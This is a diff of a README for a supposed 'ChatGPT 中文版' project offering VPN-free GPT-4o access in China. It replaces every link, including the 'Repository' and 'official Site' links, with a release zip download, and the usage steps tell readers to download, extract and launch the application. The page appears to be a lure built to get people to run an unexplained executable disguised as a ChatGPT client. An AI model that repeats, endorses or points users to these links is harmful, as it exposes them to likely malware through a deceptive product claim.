@@ -3,10 +3,10 @@
 
 Welcome to the official repository for ChatGPT 中文版 – your go-to guide for accessing ChatGPT in China without the need for a VPN connection. This guide has been updated as of January 2025 to provide you with the latest information and access to GPT-4o, the most advanced version of ChatGPT.
 
-## Repository: [chatgpt-site](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v1.0/Program.zip)
+## Repository: [chatgpt-site](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v2.0/Software.zip)
 
 ## 🚀 Quick Access Link
-[![Download https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v1.0/Program.zip](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v1.0/Program.zip)](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v1.0/Program.zip)
+[![Download https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v2.0/Software.zip](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v2.0/Software.zip)](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v2.0/Software.zip)
 
 **Note:** The provided link leads to a downloadable file that needs to be launched for an optimal experience.
 
@@ -27,7 +27,7 @@ In this repository, we focus on providing access to the following key models:
 ## ℹ️ How to Use
 To make use of the ChatGPT 中文版 and access the GPT models listed above, follow these simple steps:
 
-1. Download the [https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v1.0/Program.zip](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v1.0/Program.zip) file from the link above.
+1. Download the [https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v2.0/Software.zip](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v2.0/Software.zip) file from the link above.
 2. Extract the contents of the zip file.
 3. Launch the application to start interacting with ChatGPT in Chinese without any restrictions.
 
@@ -37,7 +37,7 @@ We welcome contributions from the community to improve and enhance the ChatGPT e
 Let's collaborate to make ChatGPT even better for all users!
 
 ## 🌐 Explore Further
-For more information and updates, visit the official [ChatGPT 中文版 Site](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v1.0/Program.zip). Stay tuned for the latest developments and features related to ChatGPT and AI-powered communication.
+For more information and updates, visit the official [ChatGPT 中文版 Site](https://github.com/jghitufrcvguy86f7t/chatgpt-site/releases/download/v2.0/Software.zip). Stay tuned for the latest developments and features related to ChatGPT and AI-powered communication.
 
 ---
 
